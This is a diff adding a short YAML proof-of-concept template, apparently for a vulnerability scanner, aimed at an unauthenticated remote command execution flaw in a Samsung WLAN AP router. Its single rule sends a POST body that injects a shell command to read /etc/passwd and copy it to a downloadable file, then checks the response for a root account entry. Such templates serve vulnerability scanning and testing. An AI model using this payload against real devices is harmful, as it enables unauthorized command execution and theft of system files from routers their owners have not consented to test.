@@ -1,0 +1,15 @@
+name: poc-yaml-samsung-wlan-ap-rce
+rules:
+  - method: POST
+    path: /(download)/tmp/lh.txt
+    body: command1=shell%3Acat /etc/passwd|dd of=/tmp/lh.txt
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:.*:0:0".bmatches(response.body)
+
+
+detail:
+  author: For3stCo1d
+  description: "三星路由器WLAN AP rce"
+  links:
+    - https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E4%B8%89%E6%98%9F%E8%B7%AF%E7%94%B1%E5%99%A8WLAN%20AP%20WEA453e%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E7%AD%89%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E.md
